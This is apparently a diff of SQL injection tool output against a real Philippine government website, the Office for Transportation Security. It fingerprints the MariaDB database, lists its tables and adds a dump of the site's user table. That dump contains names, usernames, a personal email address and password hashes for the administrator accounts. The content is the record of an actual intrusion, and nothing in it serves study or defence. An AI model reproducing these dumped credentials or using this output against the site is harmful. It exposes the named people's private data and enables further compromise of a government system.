@@ -10,9 +10,10 @@ Office For Transportation Security
 
 https://ots.gov.ph/index.php/component/content/article?id=25
 
+the back-end DBMS is MySQL
 web application technology: Apache
-
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+the back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+banner: '10.3.28-MariaDB'
 
 available databases [2]:
 [*] information_schema
@@ -171,3 +172,14 @@ Database: zbtipehaxz_Hui2Aclk4
 | xjae9_weblinks                           |
 | xjae9_wf_profiles                        |
 +------------------------------------------+
+
+Database: zbtipehaxz_Hui2Aclk4
+Table: xjae9_users
+[3 entries]
++-------------------+--------------+-------------------------+--------------------------------------------------------------+
+| name              | username     | email                   | password                                                     |
++-------------------+--------------+-------------------------+--------------------------------------------------------------+
+| GWHS Support Team | Bhy2ltP0Mk08 | <blank>                 | a03b22c06920f235c1b116e92ac864a5                             |
+| OTS Webmaster     | Gr3gDP1l4r   | vernbonifacio@gmail.com | $2y$10$U3ZktLK5OXEzWqb1SgddBO8sr/Gsp8dJMCv5fFQRDA2ApOnmn5lWK |
+| webmaster         | m4bil1sK4    | webmaster@ots.gov.ph    | 99ca2186d6b73217a4996c14a10425ce                             |
++-------------------+--------------+-------------------------+--------------------------------------------------------------+
